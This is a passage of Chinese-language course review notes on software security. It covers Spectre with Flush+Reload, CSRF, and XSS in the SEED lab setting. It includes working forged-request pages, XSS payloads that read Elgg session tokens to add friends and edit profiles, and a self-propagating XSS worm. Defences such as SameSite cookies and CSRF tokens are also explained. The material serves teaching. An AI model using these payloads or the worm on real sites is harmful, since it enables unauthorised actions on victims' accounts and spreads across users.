<h2 id="幽灵攻击"><a href="#幽灵攻击" class="headerlink" title="幽灵攻击"></a>幽灵攻击</h2><h3 id="知识内容-3"><a href="#知识内容-3" class="headerlink" title="知识内容"></a>知识内容</h3><p><img src="/2025/11/19/%E5%A4%A7%E6%A8%A1%E5%9E%8B%E6%8E%A8%E7%90%86/%E5%A4%A7%E6%A8%A1%E5%9E%8B%E5%9F%BA%E7%A1%80%E7%AE%97%E5%AD%90/mage-20251223192929286.png"></p>
<p>攻击方法注意点：</p>
<ul>
<li>注意1：需要先在缓存中刷掉size变量，这样CPU因为无法立即判断<code>x &lt; size</code>，才会进行分支预测！</li>
</ul>
<p><img src="/2025/12/20/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E8%B7%B5/%E5%A4%8D%E4%B9%A0/image-20251221200611583.png"></p>
<ul>
<li>注意2：<strong>取出的秘密值应当放到作为index放到array中</strong>（在CPU做出正确判断之前），这样才可以在缓存中找到<code>array[secret*4096 + delta]</code>。</li>
</ul>
<p><img src="/2025/12/20/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E8%B7%B5/%E5%A4%8D%E4%B9%A0/image-20251221201538500.png"></p>
<h4 id="基于统计方法"><a href="#基于统计方法" class="headerlink" title="基于统计方法"></a>基于统计方法</h4><p>就是创建<code>score[k]</code>，统计每个<code>k</code>被“激活”的次数，以此来约定秘密值。</p>
<blockquote>
<p><strong>训练阶段的副作用</strong>：<code>array[0*4096 + DELTA]</code> 总是出现在缓存中。统计的时候需要排除。</p>
</blockquote>
<h3 id="练习-3"><a href="#练习-3" class="headerlink" title="练习"></a>练习</h3><p><strong>问题：</strong> 数组大小 1024 字节，Cache Line 大小 128 字节。利用 Flush+Reload 能发送多少个不同的值？</p>
<blockquote>
<p>1024/128 = 8个。</p>
</blockquote>
<h2 id="WEB基础"><a href="#WEB基础" class="headerlink" title="WEB基础"></a>WEB基础</h2><p>感觉不是很重要，基本扫一眼就好了。</p>
<h2 id="跨站请求伪造（CSRF）"><a href="#跨站请求伪造（CSRF）" class="headerlink" title="跨站请求伪造（CSRF）"></a>跨站请求伪造（CSRF）</h2><h3 id="知识内容-4"><a href="#知识内容-4" class="headerlink" title="知识内容"></a>知识内容</h3><p><img src="/2025/12/20/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E8%B7%B5/%E5%A4%8D%E4%B9%A0/CSRF_Attack_chinese.png"></p>
<h4 id="GET请求攻击"><a href="#GET请求攻击" class="headerlink" title="GET请求攻击"></a>GET请求攻击</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">h1</span>&gt;</span>This page forges an HTTP GET request.<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"http://www.seed-server.com/action/friends/add?friend=42"</span> </span></span><br><span class="line"><span class="tag">       <span class="attr">alt</span>=<span class="string">"image"</span> <span class="attr">width</span>=<span class="string">"1"</span> <span class="attr">height</span>=<span class="string">"1"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><code>img</code> 标签将自动触发一个 HTTP GET请求：当浏览器看到 <code>img</code> 标签时，它会自动<strong>向由 <code>src</code> 属性指定的 URL 发送一个 HTTP GET 请求</strong>（跨站请求）。我们在恶意网站 <a target="_blank" rel="noopener" href="http://www.attacker32.com/">www.attacker32.com</a> 上放上制作好的网页，该网站由攻击者 Samy 控制。</p>
<h4 id="POST请求"><a href="#POST请求" class="headerlink" title="POST请求"></a>POST请求</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>This page forges an HTTP POST request.<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="language-handlebars"><span class="language-xml"></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">function forge_post()</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">{</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">  var fields;</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">  fields = "<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">'hidden'</span> <span class="attr">name</span>=<span class="string">'name'</span> <span class="attr">value</span>=<span class="string">'Alice'</span>&gt;</span>";</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">  fields += "<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">'hidden'</span> <span class="attr">name</span>=<span class="string">'description'</span></span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml"><span class="language-handlebars">                                  <span class="attr">value</span>=<span class="string">'SAMY is MY HERO'</span>&gt;</span>";</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">  fields += "<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">'hidden'</span> <span class="attr">name</span>=<span class="string">'accesslevel[description]'</span> </span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml"><span class="language-handlebars">                                  <span class="attr">value</span>=<span class="string">'2'</span>&gt;</span>"; </span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">  fields += "<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">'hidden'</span> <span class="attr">name</span>=<span class="string">'guid'</span> <span class="attr">value</span>=<span class="string">'39'</span>&gt;</span>";</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">  var p = document.createElement("form");  </span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">  p.action = "http://www.seed-server.com/action/profile/edit";</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">  p.innerHTML = fields;</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">  p.method = "post";  </span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">  document.body.appendChild(p); </span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">  p.submit();</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">}</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">window.onload = function() { forge_post();}</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"></span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="同站-cookie"><a href="#同站-cookie" class="headerlink" title="同站 cookie"></a>同站 cookie</h4><p>添加 SameSite 属性的cookie。<strong>该属性由服务器进行设置，它告诉浏览器 cookie 是否可以被跨站请求使用</strong>。浏览器按照下面规则决定是否在请求上附加 cookie：</p>
<ul>
<li><p>没有此属性的 cookie 会被附加到所有的请求上。</p>
</li>
<li><p>拥有此属性的 cookie 会被附加到同站请求上，<strong>至于它是否会附加到跨站请求上取决于该属性的具体值</strong>。Samesite 属性可以有两个值：<code>Strict</code> 和 <code>Lax</code>。</p>
<ul>
<li><code>Strict</code> 类型的 Cookie 完全不会被发送；</li>
<li>对于 POST 请求，<code>Lax</code> 类型的 Cookie 不会被发送；</li>
<li>对于 GET 请求，<code>Lax</code> 类型的 Cookie 仅在 GET 请求引发顶级导航时才会被发送（通常不发）。</li>
</ul>
</li>
</ul>
<p>这样，远端（后端）服务器就可以知道请求是否是跨站请求，从而防御此攻击！</p>
<h4 id="Secret-Token-CSRF-Token-机制"><a href="#Secret-Token-CSRF-Token-机制" class="headerlink" title="Secret Token (CSRF Token) 机制"></a>Secret Token (CSRF Token) 机制</h4><p>为了能让 Web 服务器区分收到的请求是否跨站，还有一种方法是：<strong>使用仅能被自身网页获取的密钥令牌（secret token），且该令牌需确保每个页面唯一</strong>。所有同站请求都应包含此密钥令牌，否则将被视为跨站请求。密钥令牌的植入方式通常有两种典型实现：</p>
<ul>
<li>在<strong>每个网页内嵌入一个随机的机密值</strong>。当请求从该页面发起时，该机密值被放在请求中。由于同源策略，不同源的网页不能访问此页面的内容，所以这些恶意网页就不能在跨站请求中包含正确的机密值。</li>
</ul>
<blockquote>
<p>示例：Elgg 在其所有的页面都内嵌了两个机密值：<code>__elgg_ts</code> 和 <code>__elgg_token</code>。向服务器发送请求时，都会附上这两个机密值。</p>
</blockquote>
<ul>
<li><strong>把一个机密值放在 cookie 中</strong>。当一个请求发起后，请求从 cookie 中读出该机密值并将其包含在请求的数据字段内。由于同源策略，不同源的页面将不能读取其他源的 cookie 内容，所以攻击者无法在请求的数据字段中包含该机密值（因为它无法读取 cookie 的具体值）。</li>
</ul>
<blockquote>
<p>注意，该字段独立于已经被浏览器包含在 HTTP 头中的 cookie。</p>
</blockquote>
<h3 id="练习-4"><a href="#练习-4" class="headerlink" title="练习"></a>练习</h3><p><strong>问题：</strong> Alice 不知道谁会访问她的恶意网页，但是想对访问者进行攻击。<br><strong>(1) 能修改受害者 Profile 吗？</strong><br><strong>(2) 能加受害者为好友吗？</strong></p>
<blockquote>
<p>（1）不能。POST请求需要包含受害者的GUID，但是未知。</p>
<p>（2）能。GET请求只需要包含Alice自己的GUID即可。</p>
</blockquote>
<p><strong>问题：</strong> 某服务器要求 Session ID 既在 Cookie 中，又必须在请求数据（URL/Payload）中。这为什么能防 CSRF？</p>
<blockquote>
<p>（1）Cookie 中的 Session id <mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.339ex;" xmlns="http://www.w3.org/2000/svg" width="2.049ex" height="1.339ex" role="img" focusable="false" viewBox="0 -442 905.6 592"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D460" d="M131 289Q131 321 147 354T203 415T300 442Q362 442 390 415T419 355Q419 323 402 308T364 292Q351 292 340 300T328 326Q328 342 337 354T354 372T367 378Q368 378 368 379Q368 382 361 388T336 399T297 405Q249 405 227 379T204 326Q204 301 223 291T278 274T330 259Q396 230 396 163Q396 135 385 107T352 51T289 7T195 -10Q118 -10 86 19T53 87Q53 126 74 143T118 160Q133 160 146 151T160 120Q160 94 142 76T111 58Q109 57 108 57T107 55Q108 52 115 47T146 34T201 27Q237 27 263 38T301 66T318 97T323 122Q323 150 302 164T254 181T195 196T148 231Q131 256 131 289Z"></path></g><g data-mml-node="mn" transform="translate(502,-150) scale(0.707)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g></g></g></g></svg></mjx-container>：浏览器会自动将（example.com网站的） Session ID 包含在 Cookie 头部发送给服务器。</p>
<p>（2）请求数据中的 Session id <mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.339ex;" xmlns="http://www.w3.org/2000/svg" width="2.049ex" height="1.339ex" role="img" focusable="false" viewBox="0 -442 905.6 592"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D460" d="M131 289Q131 321 147 354T203 415T300 442Q362 442 390 415T419 355Q419 323 402 308T364 292Q351 292 340 300T328 326Q328 342 337 354T354 372T367 378Q368 378 368 379Q368 382 361 388T336 399T297 405Q249 405 227 379T204 326Q204 301 223 291T278 274T330 259Q396 230 396 163Q396 135 385 107T352 51T289 7T195 -10Q118 -10 86 19T53 87Q53 126 74 143T118 160Q133 160 146 151T160 120Q160 94 142 76T111 58Q109 57 108 57T107 55Q108 52 115 47T146 34T201 27Q237 27 263 38T301 66T318 97T323 122Q323 150 302 164T254 181T195 196T148 231Q131 256 131 289Z"></path></g><g data-mml-node="mn" transform="translate(502,-150) scale(0.707)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g></g></g></g></svg></mjx-container>：受同源策略保护，来自attacker32.com的网页无法访问来自example.com的 Cookie。因此，攻击者无法伪造这个 Cookie。</p>
<p>因此，服务器检查到<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.486ex;" xmlns="http://www.w3.org/2000/svg" width="7.115ex" height="2.106ex" role="img" focusable="false" viewBox="0 -716 3144.7 931"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D460" d="M131 289Q131 321 147 354T203 415T300 442Q362 442 390 415T419 355Q419 323 402 308T364 292Q351 292 340 300T328 326Q328 342 337 354T354 372T367 378Q368 378 368 379Q368 382 361 388T336 399T297 405Q249 405 227 379T204 326Q204 301 223 291T278 274T330 259Q396 230 396 163Q396 135 385 107T352 51T289 7T195 -10Q118 -10 86 19T53 87Q53 126 74 143T118 160Q133 160 146 151T160 120Q160 94 142 76T111 58Q109 57 108 57T107 55Q108 52 115 47T146 34T201 27Q237 27 263 38T301 66T318 97T323 122Q323 150 302 164T254 181T195 196T148 231Q131 256 131 289Z"></path></g><g data-mml-node="mn" transform="translate(502,-150) scale(0.707)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g></g><g data-mml-node="mo" transform="translate(1183.3,0)"><path data-c="2260" d="M166 -215T159 -215T147 -212T141 -204T139 -197Q139 -190 144 -183L306 133H70Q56 140 56 153Q56 168 72 173H327L406 327H72Q56 332 56 347Q56 360 70 367H426Q597 702 602 707Q605 716 618 716Q625 716 630 712T636 703T638 696Q638 692 471 367H707Q722 359 722 347Q722 336 708 328L451 327L371 173H708Q722 163 722 153Q722 140 707 133H351Q175 -210 170 -212Q166 -215 159 -215Z"></path></g><g data-mml-node="msub" transform="translate(2239.1,0)"><g data-mml-node="mi"><path data-c="1D460" d="M131 289Q131 321 147 354T203 415T300 442Q362 442 390 415T419 355Q419 323 402 308T364 292Q351 292 340 300T328 326Q328 342 337 354T354 372T367 378Q368 378 368 379Q368 382 361 388T336 399T297 405Q249 405 227 379T204 326Q204 301 223 291T278 274T330 259Q396 230 396 163Q396 135 385 107T352 51T289 7T195 -10Q118 -10 86 19T53 87Q53 126 74 143T118 160Q133 160 146 151T160 120Q160 94 142 76T111 58Q109 57 108 57T107 55Q108 52 115 47T146 34T201 27Q237 27 263 38T301 66T318 97T323 122Q323 150 302 164T254 181T195 196T148 231Q131 256 131 289Z"></path></g><g data-mml-node="mn" transform="translate(502,-150) scale(0.707)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g></g></g></g></svg></mjx-container>，拒绝提供服务，攻击失效。</p>
</blockquote>
<p><strong>问题：</strong> 来自 example.com 的网页包含一个 facebook.com 的 iframe。如果请求从 iframe 内部发出，算 Cross-site 吗？如何保证安全？</p>
<blockquote>
<p>（1）是跨站的。因为一个来自 example.com 的网页发送请求到 facebook.com。</p>
<p>（2）Facebook 使用 X-Frame-Options: DENY 或 SAMEORIGIN 响应头，或者 CSP (frame-ancestors)。这会指示浏览器：<strong>不允许</strong>其他域名（如 example.com）将 Facebook 页面嵌入到 iframe 中。</p>
</blockquote>
<h2 id="跨站脚本攻击"><a href="#跨站脚本攻击" class="headerlink" title="跨站脚本攻击"></a>跨站脚本攻击</h2><h3 id="知识内容-5"><a href="#知识内容-5" class="headerlink" title="知识内容"></a>知识内容</h3><p><img src="/2025/11/19/%E5%A4%A7%E6%A8%A1%E5%9E%8B%E6%8E%A8%E7%90%86/%E5%A4%A7%E6%A8%A1%E5%9E%8B%E5%9F%BA%E7%A1%80%E7%AE%97%E5%AD%90/SS_persistent_chinese.png"></p>
<p>本质是把恶意代码注入到网站，别人访问网站的时候，就会下载到恶意代码从而被攻击。注意：<strong>实际上是同站请求</strong>！</p>
<h4 id="GET请求攻击-1"><a href="#GET请求攻击-1" class="headerlink" title="GET请求攻击"></a>GET请求攻击</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;script type=<span class="string">"text/javascript"</span>&gt;</span><br><span class="line"><span class="variable language_">window</span>.<span class="property">onload</span> = <span class="keyword">function</span> (<span class="params"></span>) {</span><br><span class="line"><span class="keyword">var</span> <span class="title class_">Ajax</span>=<span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Set the timestamp and secret token parameters </span></span><br><span class="line"><span class="keyword">var</span> ts=<span class="string">"&amp;__elgg_ts="</span>+elgg.<span class="property">security</span>.<span class="property">token</span>.<span class="property">__elgg_ts</span>;          🅰</span><br><span class="line"><span class="keyword">var</span> token=<span class="string">"&amp;__elgg_token="</span>+elgg.<span class="property">security</span>.<span class="property">token</span>.<span class="property">__elgg_token</span>; 🅱</span><br><span class="line"></span><br><span class="line"><span class="comment">// Construct the HTTP request to add Samy as a friend.  </span></span><br><span class="line"><span class="keyword">var</span> sendurl= <span class="string">"http://www.seed-server.com/action/friends/add"</span> 🅲</span><br><span class="line">              + <span class="string">"?friend=47"</span> + token + ts;                   🅳</span><br><span class="line"></span><br><span class="line"><span class="comment">//Create and send Ajax request to add friend</span></span><br><span class="line"><span class="title class_">Ajax</span>=<span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span><br><span class="line"><span class="title class_">Ajax</span>.<span class="title function_">open</span>(<span class="string">"GET"</span>, sendurl, <span class="literal">true</span>);</span><br><span class="line"><span class="title class_">Ajax</span>.<span class="title function_">send</span>();</span><br><span class="line">}</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<h4 id="POST请求攻击"><a href="#POST请求攻击" class="headerlink" title="POST请求攻击"></a>POST请求攻击</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;script type=<span class="string">"text/javascript"</span>&gt;</span><br><span class="line"><span class="variable language_">window</span>.<span class="property">onload</span> = <span class="keyword">function</span>(<span class="params"></span>){</span><br><span class="line">  <span class="keyword">var</span> guid  = <span class="string">"&amp;guid="</span> + elgg.<span class="property">session</span>.<span class="property">user</span>.<span class="property">guid</span>;</span><br><span class="line">  <span class="keyword">var</span> ts    = <span class="string">"&amp;__elgg_ts="</span> + elgg.<span class="property">security</span>.<span class="property">token</span>.<span class="property">__elgg_ts</span>; </span><br><span class="line">  <span class="keyword">var</span> token = <span class="string">"&amp;__elgg_token="</span> + elgg.<span class="property">security</span>.<span class="property">token</span>.<span class="property">__elgg_token</span>;</span><br><span class="line">  <span class="keyword">var</span> name  = <span class="string">"&amp;name="</span> + elgg.<span class="property">session</span>.<span class="property">user</span>.<span class="property">name</span>;</span><br><span class="line">  <span class="keyword">var</span> desc  = <span class="string">"&amp;description=Samy is my hero"</span> +            </span><br><span class="line">              <span class="string">"&amp;accesslevel[description]=2"</span>;      </span><br><span class="line"></span><br><span class="line">  <span class="comment">// Construct the content of your url.</span></span><br><span class="line">  <span class="keyword">var</span> sendurl = <span class="string">"http://www.seed-server.com/action/profile/edit"</span>;</span><br><span class="line">  <span class="keyword">var</span> content = token + ts + name + desc + guid;     </span><br><span class="line">  <span class="keyword">if</span> (elgg.<span class="property">session</span>.<span class="property">user</span>.<span class="property">guid</span> != <span class="number">47</span>){                    🅰</span><br><span class="line">    <span class="comment">// Create and send Ajax request to modify profile </span></span><br><span class="line">    <span class="keyword">var</span> <span class="title class_">Ajax</span>=<span class="literal">null</span>;</span><br><span class="line">    <span class="title class_">Ajax</span> = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span><br><span class="line">    <span class="title class_">Ajax</span>.<span class="title function_">open</span>(<span class="string">"POST"</span>, sendurl, <span class="literal">true</span>);</span><br><span class="line">    <span class="title class_">Ajax</span>.<span class="title function_">setRequestHeader</span>(<span class="string">"Content-Type"</span>,</span><br><span class="line">                          <span class="string">"application/x-www-form-urlencoded"</span>);</span><br><span class="line">    <span class="title class_">Ajax</span>.<span class="title function_">send</span>(content);</span><br><span class="line">  } </span><br><span class="line">} </span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>在行 🅰 我们做了个判断，检查目标用户是不是 Samy 自己，如果是的话，就不做攻击。</p>
<h4 id="XSS-蠕虫：通过-DOM-方法实现"><a href="#XSS-蠕虫：通过-DOM-方法实现" class="headerlink" title="XSS 蠕虫：通过 DOM 方法实现"></a>XSS 蠕虫：通过 DOM 方法实现</h4><p>恶意代码如何复制自身？当一个页面加载完毕时，浏览器会把页面的内容存放在一个树的数据结构（DOM（Document Object Model））里，并提供 API 供 JavaScript 访问和修改树里的数据。因此，可以使用DOM来进行恶意代码的复制。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;script id=<span class="string">"worm"</span>&gt;</span><br><span class="line">    </span><br><span class="line"><span class="comment">// Use DOM API to get a copy of the content in a DOM node.</span></span><br><span class="line"><span class="keyword">var</span> strCode = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">"worm"</span>).<span class="property">innerHTML</span>;</span><br><span class="line">    </span><br><span class="line"><span class="comment">// Displays the tag content</span></span><br><span class="line"><span class="title function_">alert</span>(strCode);</span><br><span class="line">    </span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>因此，这个自传播的 JavaScript 代码如下。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">&lt;script type=<span class="string">"text/javascript"</span> id=<span class="string">"worm"</span>&gt;</span><br><span class="line"><span class="variable language_">window</span>.<span class="property">onload</span> = <span class="keyword">function</span>(<span class="params"></span>){</span><br><span class="line">  <span class="keyword">var</span> headerTag = <span class="string">"&lt;script id=\"worm\" type=\"text/javascript\"&gt;"</span>;  🅰</span><br><span class="line">  <span class="keyword">var</span> jsCode = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">"worm"</span>).<span class="property">innerHTML</span>;</span><br><span class="line">  <span class="keyword">var</span> tailTag = <span class="string">"&lt;/"</span> + <span class="string">"script&gt;"</span>;                                   🅱</span><br><span class="line">    </span><br><span class="line">  <span class="comment">// Put all the pieces together, and apply the URI encoding </span></span><br><span class="line">  <span class="keyword">var</span> wormCode = <span class="built_in">encodeURIComponent</span>(headerTag + jsCode + tailTag);  🅲 </span><br><span class="line">    </span><br><span class="line">  <span class="comment">// Set the content of the description field and access level.</span></span><br><span class="line">  <span class="keyword">var</span> desc = <span class="string">"&amp;description=Samy is my hero"</span> + wormCode;</span><br><span class="line">  desc    += <span class="string">"&amp;accesslevel[description]=2"</span>;                         🅳</span><br><span class="line">    </span><br><span class="line">  <span class="comment">// Get the name, guid, timestamp, and token.</span></span><br><span class="line">  <span class="keyword">var</span> name = <span class="string">"&amp;name="</span> + elgg.<span class="property">session</span>.<span class="property">user</span>.<span class="property">name</span>;</span><br><span class="line">  <span class="keyword">var</span> guid = <span class="string">"&amp;guid="</span> + elgg.<span class="property">session</span>.<span class="property">user</span>.<span class="property">guid</span>;</span><br><span class="line">  <span class="keyword">var</span> ts    = <span class="string">"&amp;__elgg_ts="</span>+elgg.<span class="property">security</span>.<span class="property">token</span>.<span class="property">__elgg_ts</span>;</span><br><span class="line">  <span class="keyword">var</span> token = <span class="string">"&amp;__elgg_token="</span>+elgg.<span class="property">security</span>.<span class="property">token</span>.<span class="property">__elgg_token</span>;</span><br><span class="line">    </span><br><span class="line">  <span class="comment">// Set the URL</span></span><br><span class="line">  <span class="keyword">var</span> sendurl=<span class="string">"http://www.seed-server.com/action/profile/edit"</span>;</span><br><span class="line">  <span class="keyword">var</span> content = token + ts + name + desc + guid;       </span><br><span class="line">  </span><br><span class="line">  <span class="comment">// Construct and send the Ajax request</span></span><br><span class="line">  <span class="keyword">if</span> (elgg.<span class="property">session</span>.<span class="property">user</span>.<span class="property">guid</span> != <span class="number">47</span>){         </span><br><span class="line">    <span class="comment">// Create and send Ajax request to modify profile </span></span><br><span class="line">    <span class="keyword">var</span> <span class="title class_">Ajax</span>=<span class="literal">null</span>;</span><br><span class="line">    <span class="title class_">Ajax</span> = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span><br><span class="line">    <span class="title class_">Ajax</span>.<span class="title function_">open</span>(<span class="string">"POST"</span>, sendurl, <span class="literal">true</span>);</span><br><span class="line">    <span class="title class_">Ajax</span>.<span class="title function_">setRequestHeader</span>(<span class="string">"Content-Type"</span>,</span><br><span class="line">                          <span class="string">"application/x-www-form-urlencoded"</span>);</span><br><span class="line">    <span class="title class_">Ajax</span>.<span class="title function_">send</span>(content);</span><br><span class="line">  } </span><br><span class="line">}</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

